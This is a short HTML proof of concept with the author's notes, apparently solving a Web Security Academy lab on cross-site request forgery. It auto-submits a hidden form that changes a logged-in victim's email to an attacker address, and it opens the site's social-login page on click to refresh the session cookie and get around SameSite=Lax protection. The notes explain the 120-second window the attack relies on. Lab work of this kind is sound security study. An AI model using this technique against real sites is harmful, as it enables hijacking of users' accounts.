/*

*/

<html>
<body>
    <form action="https://0a8100010362767981b20893003d00dc.web-security-academy.net/my-account/change-email" method="POST">
        <input required="" type="email" name="email" value="hacker@tube.net"/>
    </form>
    <script>  

        function submitForm() {
            document.forms[0].submit();        
        }

        window.onclick = () => {
        window.open('https://0a8100010362767981b20893003d00dc.web-security-academy.net/social-login');
        }

        setTimeout(submitForm,5000);
    

    </script>
</body>
</html>

/*
1) going through the "social-login redirection to auth callback" phase ...changes our cookie. And within 120s after the cookie refresh, we can execute a CSRF using POST (otherwise only GET can be used since LAX...).

2) 
a) We want the victim to redirect to the auth page so that the cookie gets refreshed 
b) and right away we want the email to get changed using our csrf malicious HTML page.

....but the click in between is a window.onlick event. I didn't click anywhere still how did the email got changed?


*/